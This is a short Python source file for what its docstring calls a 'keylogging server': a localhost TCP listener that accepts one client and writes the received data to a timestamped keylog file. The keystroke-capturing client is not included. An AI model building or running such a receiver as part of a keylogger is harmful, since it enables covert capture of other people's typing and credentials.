import socket
import logging
from datetime import datetime

# Server Configuration
HOST = '127.0.0.1'   # Localhost for testing
PORT = 65432         # Arbitrary non-privileged port

# Configure Logging to file and console
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = f"server_keylog_{timestamp}.txt"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()  # Output to console
    ]
)

def start_server():
    """Starts the keylogging server that receives data from the client."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen()
        print(f"Server started at {HOST}:{PORT}. Waiting for client connection...")

        conn, addr = server_socket.accept()
        with conn:
            print(f"Connected by {addr}")
            while True:
                data = conn.recv(1024)  # Receive data in small chunks
                if not data:
                    break
                decoded_data = data.decode('utf-8')
                logging.info(decoded_data)  # Log to file and console

# Run the server
if __name__ == "__main__":
    start_server()
